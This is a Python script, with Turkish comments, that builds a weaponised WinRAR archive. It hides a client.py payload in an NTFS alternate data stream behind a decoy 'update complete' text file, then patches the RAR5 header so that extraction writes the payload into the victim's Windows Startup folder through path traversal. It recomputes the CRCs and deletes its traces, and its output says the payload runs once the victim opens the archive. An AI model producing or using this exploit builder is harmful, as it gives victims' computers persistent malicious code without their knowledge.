import os
import shutil
import subprocess
import struct
import zlib
from pathlib import Path

RAR5_SIG = b"Rar!\x1A\x07\x01\x00"


class WinRARPythonExploit:
    def __init__(self):
        self.winrar_path = self._find_winrar()

    def _find_winrar(self):
        paths = [
            r"C:\Program Files\WinRAR\rar.exe",
            r"C:\Program Files (x86)\WinRAR\rar.exe"
        ]
        for p in paths:
            if os.path.exists(p):
                return p
        return None

    def create_python_rar(self, client_py_path: str, output_rar: str):
        try:
            if not os.path.exists(client_py_path):
                print("[-] client.py bulunamadı!")
                return False
            if not self.winrar_path:
                print("[-] WinRAR yüklü değil!")
                return False

            workdir = Path.cwd()
            client_py = Path(client_py_path)
            decoy = workdir / "decoy.txt"
            base_rar = workdir / "base.rar"

            # 1. Decoy + ADS
            decoy.write_text("Güncelleme tamamlandı!\nLütfen bekleyin...", encoding="utf-8")
            ads_name = "A" * 150  # Placeholder
            ads_path = f"{decoy}:{ads_name}"
            shutil.copyfile(client_py, ads_path)
            print(f"[+] client.py → ADS eklendi: {ads_path}")

            # 2. Base RAR (ADS dahil)
            cmd = f'"{self.winrar_path}" a -ep -os "{base_rar}" "{decoy}"'
            subprocess.run(cmd, shell=True, check=True)
            print(f"[+] Base RAR oluşturuldu: {base_rar}")

            # 3. Header Patch: ADS → Startup + python.exe
            target = "..\\..\\..\\..\\..\\..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.py"
            self._patch_rar(base_rar, Path(output_rar), ads_name, target)

            # 4. Temizlik
            os.system(f'attrib -h "{ads_path}" & del "{ads_path}"')
            decoy.unlink()
            base_rar.unlink()

            print(f"[+] EXPLOIT HAZIR: {output_rar}")
            print(f"    Kurban açtığında → client.py → Startup + python.exe ile çalışır!")
            return True

        except Exception as e:
            print(f"[-] Hata: {e}")
            return False

    def _patch_rar(self, base_rar: Path, out_rar: Path, placeholder: str, target: str):
        data = bytearray(base_rar.read_bytes())
        placeholder_utf8 = placeholder.encode("utf-8")
        target_utf8 = target.encode("utf-8")

        if len(target_utf8) > len(placeholder_utf8):
            raise ValueError("Target çok uzun!")

        pos = data.find(RAR5_SIG) + len(RAR5_SIG)
        patched = 0
        while pos + 4 < len(data):
            try:
                header_size, hsz_len = self._get_vint(data, pos + 4)
                header_start = pos + 4 + hsz_len
                header_end = header_start + header_size
                if header_end > len(data): break

                hdr = bytearray(data[header_start:header_end])
                i = hdr.find(b":" + placeholder_utf8)
                if i != -1:
                    start = i + 1
                    hdr[start:start + len(target_utf8)] = target_utf8
                    hdr[start + len(target_utf8):start + len(placeholder_utf8)] = b'\x00' * (
                                len(placeholder_utf8) - len(target_utf8))
                    data[header_start:header_end] = hdr
                    patched += 1

                # Next block
                hflags, n2 = self._get_vint(data, header_start);
                i = header_start + n2
                if (hflags & 0x0002):  # HFL_DATA
                    datasz, n4 = self._get_vint(data, i);
                    i += n4
                pos = header_end + datasz
            except:
                break

        if patched == 0:
            raise RuntimeError("Placeholder bulunamadı!")

        # CRC yeniden hesapla
        self._rebuild_crc(data)
        out_rar.write_bytes(data)
        print(f"[+] {patched} yer patched, CRC güncellendi.")

    def _get_vint(self, buf, off):
        val, shift, i = 0, 0, off
        while i < len(buf):
            b = buf[i];
            i += 1
            val |= (b & 0x7F) << shift
            if not (b & 0x80): break
            shift += 7
        return val, i - off

    def _rebuild_crc(self, buf):
        pos = buf.find(RAR5_SIG) + len(RAR5_SIG)
        while pos + 4 < len(buf):
            try:
                header_size, hsz_len = self._get_vint(buf, pos + 4)
                header_start = pos + 4 + hsz_len
                header_end = header_start + header_size
                if header_end > len(buf): break
                region = buf[pos + 4:header_end]
                crc = zlib.crc32(region) & 0xFFFFFFFF
                struct.pack_into("<I", buf, pos, crc)
                pos = header_end + (self._get_vint(buf, header_start + hsz_len + 2)[0] if header_size > 0 else 0)
            except:
                break